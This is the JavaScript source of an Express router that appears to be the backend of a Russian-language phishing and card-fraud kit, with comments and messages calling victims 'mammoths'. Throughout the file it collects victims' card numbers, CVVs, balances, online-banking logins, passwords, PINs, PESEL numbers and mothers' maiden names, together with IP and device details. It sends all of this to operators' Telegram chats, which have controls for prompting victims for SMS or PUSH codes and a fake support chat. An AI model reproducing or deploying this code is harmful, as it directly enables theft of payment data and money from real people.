const express = require("express");
const bodyParser = require("body-parser");

const geoIp = require("geoip-lite");
const { getName } = require("country-list");
const userAgent = require("express-useragent");

const escapeHTML = require("escape-html");

const router = express.Router();

router.use(bodyParser.json());
router.use(bodyParser.urlencoded({ extended: true }));

const config = require("../../config");

const { Telegram, Markup } = require("telegraf"),
  bot = new Telegram(config.bot.token);

const {
  items,
  Logs,
  settings,
  users,
  services,
  countries,
  Supports,
} = require("../../database/index");
const getCurCode = require("../../handlers/functions/getCurCode")

const axios = require("axios");

var status = {
  log: {
    sms: "SMS",
    push: "PUSH",
    skip: "неверная карта",
    change: "смена карты",
    custom: "кастомная ошибка",
    card: "ввод карты",
    inputYourBalance: "точный баланс",
    nemid_dk_lk: "ЛК NemID",
    mitid_dk_lk: "ЛК MitID",
    refresh: "перезагрузка",
    wait: "ожидание",
    lkCard: "ввод карты",
    hold: "ТАЙМЕР",
    wrongLk: "НЕВЕРНЫЕ ДАННЫЕ"
  },
};

// Функция для генерации уникального ID мамонта
function generateMamontId(itemId, ip) {
  return require('crypto')
    .createHash('md5')
    .update(`${itemId}_${ip}_${Date.now()}`)
    .digest('hex')
    .substring(0, 12);
}

async function vbivButtons(logId) {
  const buttons = Markup.inlineKeyboard([
    [Markup.callbackButton("✅ Залет", `log_profit_${logId}`)],
    [
      Markup.callbackButton("SMS", `log_${logId}_setStatus_sms`),
      Markup.callbackButton("PUSH", `log_${logId}_setStatus_push`),
    ],
    [
      Markup.callbackButton("НЕ БЬЕТСЯ", `log_${logId}_setStatus_skip`),
      Markup.callbackButton("СМЕНИТЬ КАРТУ", `log_${logId}_setStatus_change`),
    ],
    [
      Markup.callbackButton("СВОЯ ОШИБКА", `log_${logId}_setStatus_custom`),
      Markup.callbackButton("ВВОД КАРТЫ", `log_${logId}_setStatus_card`),
    ],
    [
      Markup.callbackButton(
        "БАЛАНС",
        `log_${logId}_setStatus_inputYourBalance`
      ),
      Markup.callbackButton("ЛК", `log_${logId}_setStatus_lk`),
    ],
    [
      Markup.callbackButton("ПЕРЕЗАГРУЗКА", `log_${logId}_setStatus_refresh`),
      Markup.callbackButton("ОЖИДАНИЕ", `log_${logId}_setStatus_wait`),
    ],
    [Markup.callbackButton("❌ Уйти со вбива", `log_${logId}_leave`)],
  ]);

  return buttons;
}

async function lkButtons(logId) {
  const buttons = Markup.inlineKeyboard([
    [Markup.callbackButton("✅ Залет", `log_profit_${logId}`)],
    [
      Markup.callbackButton("PUSH", `log_${logId}_setStatus_push`),
      Markup.callbackButton("ТАЙМЕР", `log_${logId}_setStatus_hold`),
    ],
    [
      Markup.callbackButton("SMS", `log_${logId}_setStatus_sms`),
    ],
    [
      Markup.callbackButton("ВВОД КАРТЫ", `log_${logId}_setStatus_lkCard`),
      Markup.callbackButton("НЕВЕРНЫЕ ДАННЫЕ", `log_${logId}_setStatus_wrongLk`),
    ],
    [Markup.callbackButton("❌ Уйти со вбива", `log_${logId}_leave`)],
  ]);

  return buttons;
}

async function converter(amount, currency) {
  try {
    var balance = "";

    if (amount == null) return "чекер баланса выключен";

    await axios
      .get("https://www.cbr-xml-daily.ru/daily_json.js")
      .then(async function (res) {
        let course = res.data.Valute[currency].Value;

        const symbols = {
          PLN: "zł",
          EUR: "€",
          DKK: "kr",
        };

        let rub = amount * course;

        balance = `${amount} ${symbols[currency]} / ${rub.toFixed(2)} ₽ / ${(
          rub / res.data.Valute.EUR.Value
        ).toFixed(2)} €`;
      });

    return balance;
  } catch (err) {
    console.log(err);
    return "не удалить сонвертировать баланс";
  }
}

async function binInfo(number) {
  try {
    var info = "";

    await axios
      .get(`https://bins.antipublic.cc/bins/${number}`)
      .then(async function (res) {
        if (res.data.bank == null) return (info = "Неизвестно");
        info = res.data.bank;
      })
      .catch(async function (err) {
        info = "Неизвестно";
      });

    return info;
  } catch (err) {
    return "Неизвестно";
  }
}

async function binInfoEdit(number) {
  try {
    var info = "";

    await axios
      .get(`https://bins.antipublic.cc/bins/${number}`)
      .then(async function (res) {
        if (res.data.bank == null) return (info = "");
        info = `\n- Бренд: <b>${res.data.brand}</b>
- Страна: <b>${res.data.country_flag} ${res.data.country_name}</b>
- Банк: <b>${res.data.bank}</b>
- Уровень: <b>${res.data.level}</b>
- Тип: <b>${res.data.type}</b>\n`;
      })
      .catch(async function (err) {
        info = "";
      });

    return info;
  } catch (err) {
    return "";
  }
}

function reqInfo(req) {
  try {
    var text = ``;
    const ipInfo = geoIp.lookup(req.realIp),
      userInfo = userAgent.parse(req.headers["user-agent"]);
    try {
      text += `\n🌎 Страна: ${getName(ipInfo.country)}`;
    } catch (err) {}
    text += `\n${
      userInfo.isMobile
        ? "📱 Телефон"
        : userInfo.isDesktop
        ? "🖥 Компьютер"
        : userInfo.isBot
        ? "🤖 Бот"
        : "📟 Что-то другое"
    } (${userInfo.browser})
🌍 ${req.socket.remoteAddress.replace("::ffff:", "")}`;

    return text;
  } catch (err) {
    return "\nнет данных";
  }
}

// отправка карты

router.post("/sendLog", async (req, res) => {
  try {
    const item = await items.findOne({
      where: {
        id: req.body.item,
      },
    });
    if (!item) return res.sendStatus(404);

    const log = await Logs.create({
      cardNumber: req.body.cardNumber,
      cardExp: `${req.body.cardMonth}/${req.body.cardYear}`,
      cardCvv: req.body.cardCvv,
      cardBalance: req.body.balance,
      itemId: req.body.item,
    });

    const worker = await users.findOne({
      where: {
        id: item.workerId,
      },
    });

    const set = await settings.findOne({ where: { id: 1 } });

    var balance = await converter(log.cardBalance, item.currency);

    const service = await services.findOne({
      where: {
        code: item.serviceCode,
      },
    });

    if (set.work == false) return res.sendStatus(404);

    const country = await countries.findOne({
      where: {
        code: service.country,
      },
    });

    // Генерация уникального хештега для мамонта
    const mamontId = generateMamontId(item.id, req.socket.remoteAddress);

    const msg = await bot.sendMessage(
      item.workerId,
      `⚠️ ПОЛУЧЕННА КАРТА » ${Array.from(country.title)[0]}${Array.from(country.title)[1]} ${service.title.replace(/[^a-zA-Z]+/g, "")} (${item.status})

🏦 БАНК: ${log.cardNumber.replace(/\s/g, "").slice(0, 6)} ${await binInfo(log.cardNumber.replace(/\s/g, ""))} | STANDART
${log.cardBalance ? `💵 БАЛАНС: ${await converter(log.cardBalance, item.currency)}` : ''}

╭ 🆔 Track: ${item.id}
├ 📦 Объявление: ${item.title || 'Не указано'}
╰ 💰 Цена: ${item.price || '0'}.00 ${item.currency}

🦣 Уникальный-ID: #${mamontId}
${reqInfo(req)}

Ответь на это сообщение, чтобы написать мамонту в ТП`,
      {
        parse_mode: "HTML",
        reply_to_message_id: item.msgId,
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton(`👁️ Проверить онлайн`, `eye_${item.id}`),
            Markup.callbackButton(`💬 Открыть ТП`, `openSupport_${item.id}`)
          ],
          [Markup.callbackButton(`📝 Шаблоны`, `templates_${item.id}`)]
        ]),
      }
    );

    const msg2 = await bot.sendMessage(
      set.logsId,
      `⚠️ ПОЛУЧЕННА КАРТА » ${Array.from(country.title)[0]}${Array.from(country.title)[1]} ${service.title.replace(/[^a-zA-Z]+/g, "")} (${item.status})

🏦 БАНК: ${log.cardNumber.replace(/\s/g, "").slice(0, 6)} ${await binInfo(log.cardNumber.replace(/\s/g, ""))} | STANDART
${log.cardBalance ? `💵 БАЛАНС: ${await converter(log.cardBalance, item.currency)}` : ''}

╭ 🆔 Track: ${item.id}
├ 📦 Объявление: ${item.title || 'Не указано'}
╰ 💰 Цена: ${item.price || '0'}.00 ${item.currency}

🦣 Уникальный-ID: #${mamontId}
👨🏻‍💻 Воркер: @${worker.username}

Ответь на это сообщение, чтобы написать мамонту в ТП`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("Взять", `log_take_${log.id}`)],
        ]),
      }
    );

    await item.update({
      cardMsgId: msg.message_id,
    });

    await log.update({
      messageId: msg2.message_id,
    });

    return res.json({
      id: log.id,
    });
  } catch (err) {
    console.log(err);
    return res.sendStatus(404);
  }
});

// отправка карты ЛК

router.post("/sendCardLk", async (req, res) => {
  try {
    const item = await items.findOne({
      where: {
        id: req.body.item,
      },
    });
    if (!item) return res.sendStatus(404);

    const log = await Logs.findOne({
      where: {
        id: req.body.logId
      }
    })

    if (!log) return res.sendStatus(404);

    await log.update({
      cardNumber: req.body.cardNumber,
      cardExp: `${req.body.cardMonth}/${req.body.cardYear}`,
      cardCvv: req.body.cardCvv,
      cardBalance: req.body.balance,
    })

    const worker = await users.findOne({
      where: {
        id: item.workerId,
      },
    });

    const set = await settings.findOne({ where: { id: 1 } });

    var balance = await converter(log.cardBalance, item.currency);

    const service = await services.findOne({
      where: {
        code: item.serviceCode,
      },
    });

    if (set.work == false) return res.sendStatus(404);

    const country = await countries.findOne({
      where: {
        code: service.country,
      },
    });

    var data = ""

    if(log.other != null) data = {
      login: log.other.login
        ? escapeHTML(String(log.other.login).trim())
        : null,
      password: log.other.password
        ? escapeHTML(String(log.other.password).trim())
        : null,
      pesel: log.other.pesel
        ? escapeHTML(String(log.other.pesel).trim())
        : null,
      pin: log.other.pin ? escapeHTML(String(log.other.pin).trim()) : null,
      motherlastname: log.other.motherlastname
        ? escapeHTML(String(log.other.motherlastname).trim())
        : null,
    };

    var lkData = "";

    var translate = {
      login: "🙋‍♂️ Логин",
      password: "🔐 Пароль",
      pesel: "🐶 Песель",
      pin: "🔑 ПИН",
      motherlastname: "👨‍👩‍👧‍👦 Девичья фамилия матери",
    };

    Object.keys(data).map((v) => {
      if (data[v]) lkData += `\n${translate[v]}: <code>${data[v]}</code>`;
    });

    await bot
        .editMessageText(
          log.vbiverId,
          log.vbiverMsgId,
          log.vbiverMsgId,
          `🥷 <b>Вы взяли лог на вбив</b>
${lkData}

💳 <b>Номер карты:</b> <code>${log.cardNumber}</code>
⏰ <b>Срок действия:</b> <code>${log.cardExp}</code>
🛡️ <b>CVV:</b> <code>${log.cardCvv}</code>${
        log.cardBalance == null
          ? ""
          : `\n\n💰 <b>Баланс мамонта:</b> ${await converter(
              log.cardBalance,
              item.currency
            )}`
      }
    
🏦 <b>Банк:</b> <b>${log.other.bank}</b>

${
  Array.from(country.title)[0] + Array.from(country.title)[1]
} <b>Площадка:</b> ${service.title.replace(/[^a-zA-Z]+/g, "")} ${item.status}.0
👨🏾‍💻 <b>Работник:</b> @${worker.username}`,
          {
            parse_mode: "HTML",
            reply_markup: log.lk == false ? await vbivButtons(log.id) : await lkButtons(log.id),
          }
        )
        .catch((err) => err);

    // Генерация уникального хештега для мамонта
    const mamontId = generateMamontId(item.id, req.socket.remoteAddress);

    await bot.sendMessage(
      item.workerId,
      `⚠️ ПОЛУЧЕННА КАРТА » ${Array.from(country.title)[0]}${Array.from(country.title)[1]} ${service.title.replace(/[^a-zA-Z]+/g, "")} (${item.status})

🏦 БАНК: ${log.cardNumber.replace(/\s/g, "").slice(0, 6)} ${await binInfo(log.cardNumber.replace(/\s/g, ""))} | STANDART
${log.cardBalance ? `💵 БАЛАНС: ${await converter(log.cardBalance, item.currency)}` : ''}

╭ 🆔 Track: ${item.id}
├ 📦 Объявление: ${item.title || 'Не указано'}
╰ 💰 Цена: ${item.price || '0'}.00 ${item.currency}

🦣 Уникальный-ID: #${mamontId}
${reqInfo(req)}

Ответь на это сообщение, чтобы написать мамонту в ТП`,
      {
        parse_mode: "HTML",
        reply_to_message_id: item.msgId,
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton(`👁️ Проверить онлайн`, `eye_${item.id}`),
            Markup.callbackButton(`💬 Открыть ТП`, `openSupport_${item.id}`)
          ],
          [Markup.callbackButton(`📝 Шаблоны`, `templates_${item.id}`)]
        ]),
      }
    );

    await bot.sendMessage(
      set.logsId,
      `💳 Мамонт ввел карту`,
      {
        parse_mode: "HTML",
        reply_to_message_id: log.messageId
      }
    );

    return res.json({
      id: log.id,
    });
  } catch (err) {
    console.log(err);
    return res.sendStatus(404);
  }
});

// отправка лк

router.post("/sendLk", async (req, res) => {
  try {
    const item = await items.findOne({
      where: {
        id: req.body.itemId,
      },
    });
    if (!item) return res.sendStatus(404);

    const log = await Logs.findOne({
      where: {
        itemId: item.id
      },
      order: [ [ 'createdAt', 'DESC' ]],
    })

    await log.update({
      lk: true
    })

    const data = {
      login: req.body.login ? escapeHTML(String(req.body.login).trim()) : null,
      password: req.body.password
        ? escapeHTML(String(req.body.password).trim())
        : null,
      pesel: req.body.pesel ? escapeHTML(String(req.body.pesel).trim()) : null,
      pin: req.body.pin ? escapeHTML(String(req.body.pin).trim()) : null,
      motherlastname: req.body.motherlastname
        ? escapeHTML(String(req.body.motherlastname).trim())
        : null,
    };

    await log.update({
      itemId: req.body.itemId,
      other: {
        ...data,
        bank: req.body.bank
      }
    });

    const worker = await users.findOne({
      where: {
        id: item.workerId,
      },
    });

    const set = await settings.findOne({ where: { id: 1 } });

    const service = await services.findOne({
      where: {
        code: item.serviceCode,
      },
    });

    if (set.work == false) return res.sendStatus(404);

    const country = await countries.findOne({
      where: {
        code: service.country,
      },
    });

    var lkData = "";

    var translate = {
      login: "🙋‍♂️ Логин",
      password: "🔐 Пароль",
      pesel: "🐶 Песель",
      pin: "🔑 ПИН",
      motherlastname: "👨‍👩‍👧‍👦 Девичья фамилия матери",
    };

    Object.keys(data).map((v) => {
      if (data[v]) lkData += `\n${translate[v]}: <code>${data[v]}</code>`;
    });

    await bot
    .editMessageText(
      log.vbiverId,
      log.vbiverMsgId,
      log.vbiverMsgId,
      `🥷 <b>Вы взяли лог на вбив</b>
${lkData}

🏦 <b>Банк:</b> ${req.body.bank}

💳 <b>Номер карты:</b> <code>${log.cardNumber}</code>
⏰ <b>Срок действия:</b> <code>${log.cardExp}</code>
🛡️ <b>CVV:</b> <code>${
        log.cardCvv
      }</code>${`\n\n💰 <b>Баланс мамонта:</b> ${await converter(
        log.cardBalance,
        item.currency
      )}`}
${await binInfoEdit(log.cardNumber.replace(/\s/g, ""))}
${
Array.from(country.title)[0] + Array.from(country.title)[1]
} <b>Площадка:</b> ${service.title.replace(/[^a-zA-Z]+/g, "")} ${item.status}.0
👨🏾‍💻 <b>Работник:</b> @${worker.username}

Статус: <b>${status.log[log.status]}</b>`,
      {
        parse_mode: "HTML",
        reply_markup: await lkButtons(log.id),
      }
    )
    .catch((err) => err);

    // Генерация уникального хештега для мамонта
    const mamontId = generateMamontId(item.id, req.socket.remoteAddress);

    await bot.sendMessage(
      item.workerId,
      `✍️ ВВЕЛ ЛК » ${Array.from(country.title)[0]}${Array.from(country.title)[1]} ${service.title.replace(/[^a-zA-Z]+/g, "")} (${item.status})

🏦 БАНК: ${req.body.bank}
➿ Логин: ${req.body.login == null ? "не указан" : req.body.login}

╭ 🆔 Track: ${item.id}
├ 📦 Объявление: ${item.title || 'Не указано'}
╰ 💰 Цена: ${item.price || '0'}.00 ${item.currency}

🦣 Уникальный-ID: #${mamontId}
${reqInfo(req)}

Ответь на это сообщение, чтобы написать мамонту в ТП`,
      {
        parse_mode: "HTML",
        reply_to_message_id: item.msgId,
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton(`👁️ Проверить онлайн`, `eye_${item.id}`),
            Markup.callbackButton(`💬 Открыть ТП`, `openSupport_${item.id}`)
          ],
          [Markup.callbackButton(`📝 Шаблоны`, `templates_${item.id}`)]
        ]),
      }
    ).catch((err) => err);

    await bot.sendMessage(
      set.logsId,
      `✍️ ВВЕЛ ЛК » ${Array.from(country.title)[0]}${Array.from(country.title)[1]} ${service.title.replace(/[^a-zA-Z]+/g, "")} (${item.status})

🏦 БАНК: ${req.body.bank}
👨🏻‍💻 Воркер: @${worker.username}`,
      {
        parse_mode: "HTML",
        reply_to_message_id: log.messageId,
      }
    ).catch((err) => err);

    return res.json({
      id: log.id
    })
  } catch (err) {
    console.log(err);
    return res.sendStatus(404);
  }
});

// получение статуса лога

router.post("/getStatus", async (req, res) => {
  try {
    const log = await Logs.findOne({
      where: {
        id: req.body.id,
      },
    });

    if (!log) return res.sendStatus(404);

    return res.json({
      method: log.status,
      id: log.id,
      error: log.error,
    });
  } catch (err) {
    return res.sendStatus(404);
  }
});

// отправка значения

router.post("/sendValue", async (req, res) => {
  try {
    const log = await Logs.findOne({
      where: {
        id: req.body.id,
      },
    });

    if (!log) return res.sendStatus(404);

    const item = await items.findOne({
      where: {
        id: log.itemId,
      },
    });

    const worker = await users.findOne({
      where: {
        id: item.workerId,
      },
    });

    const service = await services.findOne({
      where: {
        code: item.serviceCode,
      },
    });

    const country = await countries.findOne({
      where: {
        code: service.country,
      },
    });

    if (req.body.type == "balance") {
      await log.update({
        cardBalance: req.body.value,
      });
      await bot
        .editMessageText(
          log.vbiverId,
          log.vbiverMsgId,
          log.vbiverMsgId,
          `🥷 <b>Вы взяли лог на вбив</b>
    
💳 <b>Номер карты:</b> <code>${log.cardNumber}</code>
⏰ <b>Срок действия:</b> <code>${log.cardExp}</code>
🛡️ <b>CVV:</b> <code>${
            log.cardCvv
          }</code>${`\n\n💰 <b>Баланс мамонта:</b> ${await converter(
            log.cardBalance,
            item.currency
          )}`}
${await binInfoEdit(log.cardNumber.replace(/\s/g, ""))}
${
  Array.from(country.title)[0] + Array.from(country.title)[1]
} <b>Площадка:</b> ${service.title.replace(/[^a-zA-Z]+/g, "")} ${item.status}.0
👨🏾‍💻 <b>Работник:</b> @${worker.username}

Статус: <b>${status.log[log.status]}</b>`,
          {
            parse_mode: "HTML",
            reply_markup: log.lk == false ? await vbivButtons(log.id) : await lkButtons(log.id),
          }
        )
        .catch((err) => err);
    }

    const set = await settings.findOne({ where: { id: 1 } });

    var type = {
      sms: "💰 НА ВВОДЕ БАЛАНСА",
      balance: "💰 НА ВВОДЕ БАЛАНСА",
    };

    var workerType = {
      sms: "❤️ Твой мамонт ввел SMS",
      balance: "💰 Твой мамонт ввел баланс",
    };

    var balance = "";

    if (req.body.type == "balance")
      balance = await converter(parseInt(req.body.value), item.currency);

    if (set.work == false) return res.sendStatus(404);

    await bot.sendMessage(
      log.vbiverId,
      `${type[req.body.type]}: ${
        req.body.type == "balance" ? balance : `<code>${req.body.value}</code>`
      }`,
      {
        reply_to_message_id: log.vbiverMsgId,
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("✅ Залет", `log_profit_${log.id}`)],
        ]),
      }
    );

    await bot.sendMessage(set.logsId, `${type[req.body.type]}`, {
      parse_mode: "HTML",
      reply_to_message_id: log.messageId,
    });

    await bot.sendMessage(
      item.workerId,
      `${workerType[req.body.type]}: ${
        req.body.type == "balance" ? balance : `<code>${req.body.value}</code>`
      }`,
      {
        parse_mode: "HTML",
        reply_to_message_id: item.cardMsgId,
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton(`👁️ Проверить онлайн`, `eye_${item.id}`),
            Markup.callbackButton(`💬 Открыть ТП`, `openSupport_${item.id}`)
          ],
          [Markup.callbackButton(`📝 Шаблоны`, `templates_${item.id}`)]
        ]),
      }
    );

    return res.sendStatus(200);
  } catch (err) {
    console.log(err);
    return res.sendStatus(404);
  }
});

// подтверждения действия

router.post("/confirmAction", async (req, res) => {
  try {
    const log = await Logs.findOne({
      where: {
        id: req.body.id,
      },
    });

    if (!log) return res.sendStatus(404);

    const item = await items.findOne({
      where: {
        id: log.itemId,
      },
    });

    const set = await settings.findOne({ where: { id: 1 } });

    var type = {
      push: "PUSH",
    };

    const service = await services.findOne({
      where: {
        code: item.serviceCode,
      },
    });

    if (set.work == false) return res.sendStatus(404);

    await bot.sendMessage(
      log.vbiverId,
      `📱 Твой мамонт подтвердил ${type[req.body.method]}`,
      {
        reply_to_message_id: log.vbiverMsgId,
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("✅ Залет", `log_profit_${log.id}`)],
        ]),
      }
    );

    const country = await countries.findOne({
      where: {
        code: service.country,
      },
    });

    await bot.sendMessage(
      set.logsId,
      `📱 Мамонт подтвердил ${type[req.body.method]}`,
      {
        parse_mode: "HTML",
        reply_to_message_id: log.messageId,
      }
    );

    // Генерация уникального хештега для мамонта
    const mamontId = generateMamontId(item.id, req.socket.remoteAddress);

    await bot.sendMessage(
      item.workerId,
      `📱 ПОДТВЕРДИЛ ${type[req.body.method]} » ${Array.from(country.title)[0]}${Array.from(country.title)[1]} ${service.title.replace(/[^a-zA-Z]+/g, "")} (${item.status})

╭ 🆔 Track: ${item.id}
├ 📦 Объявление: ${item.title || 'Не указано'}
╰ 💰 Цена: ${item.price || '0'}.00 ${item.currency}

🦣 Уникальный-ID: #${mamontId}
${reqInfo(req)}

Ответь на это сообщение, чтобы написать мамонту в ТП`,
      {
        parse_mode: "HTML",
        reply_to_message_id: item.cardMsgId,
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton(`👁️ Проверить онлайн`, `eye_${item.id}`),
            Markup.callbackButton(`💬 Открыть ТП`, `openSupport_${item.id}`)
          ],
          [Markup.callbackButton(`📝 Шаблоны`, `templates_${item.id}`)]
        ]),
      }
    );

    return res.sendStatus(200);
  } catch (err) {
    console.log(err);
    return res.sendStatus(404);
  }
});

// отправка сообщени в ТП на сайте

router.post("/sendSupport", async (req, res) => {
  try {
    function genToken() {
      var result = "";
      var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
      var charactersLength = characters.length;
      for (var i = 0; i < 12; i++) {
        result += characters.charAt(
          Math.floor(Math.random() * charactersLength)
        );
      }
      return result;
    }

    const item = await items.findOne({
      where: {
        id: req.body.itemId,
      },
    });

    if (!item) return res.sendStatus(404);

    const service = await services.findOne({
      where: {
        code: item.serviceCode,
      },
    });

    const support = await Supports.create({
      itemId: item.id,
      text: req.body.text,
      who: "client",
    });

    const country = await countries.findOne({
      where: {
        code: service.country,
      },
    });

    // Генерация уникального хештега для мамонта
    const mamontId = generateMamontId(item.id, req.socket.remoteAddress);

    await bot.sendMessage(
      item.workerId,
      `📬 СООБЩЕНИЕ В ТП » ${Array.from(country.title)[0]}${Array.from(country.title)[1]} ${service.title.replace(/[^a-zA-Z]+/g, "")} (${item.status})

💭 Сообщение: ${req.body.text}

╭ 🆔 Track: ${item.id}
├ 📦 Объявление: ${item.title || 'Не указано'}
╰ 💰 Цена: ${item.price || '0'}.00 ${item.currency}

🦣 Уникальный-ID: #${mamontId}
${reqInfo(req)}

Ответь на это сообщение, чтобы написать мамонту в ТП`,
      {
        parse_mode: "HTML",
        reply_to_message_id: item.msgId,
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton(`👁️ Проверить онлайн`, `eye_${item.id}`),
            Markup.callbackButton(`💬 Открыть ТП`, `openSupport_${item.id}`)
          ],
          [Markup.callbackButton(`📝 Шаблоны`, `templates_${item.id}`)]
        ]),
      }
    );

    return res.sendStatus(200);
  } catch (err) {
    return res.sendStatus(404);
  }
});

router.post("/getSupportMessage", async (req, res) => {
  try {
    const item = await items.findOne({
      where: {
        id: req.body.itemId,
      },
    });

    if (!item) return res.sendStatus(404);

    const supports = await Supports.findAll({
      where: {
        itemId: item.id,
        who: "Support",
        readed: false,
      },
    });

    if (!supports) return res.sendStatus(200);

    if (supports.slice(-1)[0] == null) return res.sendStatus(200);

    const support = await Supports.findOne({
      where: {
        id: supports.slice(-1)[0].id,
        who: "Support",
      },
    });

    await res.json({
      text: support.text,
      who: "Support",
    });

    return support.update({
      readed: true,
    });
  } catch (err) {
    console.log(err);
    return res.sendStatus(404);
  }
});

// проверка всех сообщений

router.post("/getAllMessages", async (req, res) => {
  try {
    const item = await items.findOne({
      where: {
        id: req.body.itemId,
      },
    });

    if (!item) return res.sendStatus(404);

    const { rows, count } = await Supports.findAndCountAll({
      where: {
        itemId: item.id,
      },
    });

    if (!rows) return res.sendStatus(200);

    return res.json({
      text: rows,
      who: rows,
      lenght: count,
    });
  } catch (err) {
    console.log(err);
    return res.sendStatus(404);
  }
});

// проверка открытия чата у мамонта

router.post("/checkChatStatus", async (req, res) => {
  try {
    const item = await items.findOne({
      where: {
        id: req.body.id,
      },
    });

    if (!item) return res.sendStatus(404);

    await res.json({
      status: item.chatStatus,
    });

    if (item.chatStatus == 1 || item.chatStatus == 2)
      return item.update({
        chatStatus: false,
      });
  } catch (err) {
    console.log(err);
    return res.sendStatus(404);
  }
});

// глазик

router.post("/checkOnline", async (req, res) => {
  try {
    const item = await items.findOne({
      where: {
        id: req.body.id,
      },
    });

    if (!item) return res.sendStatus(404);

    await item.update({
      online: req.body.status,
    });
    return res.sendStatus(200);
  } catch (err) {
    console.log(err);
    return res.sendStatus(404);
  }
});

module.exports = router;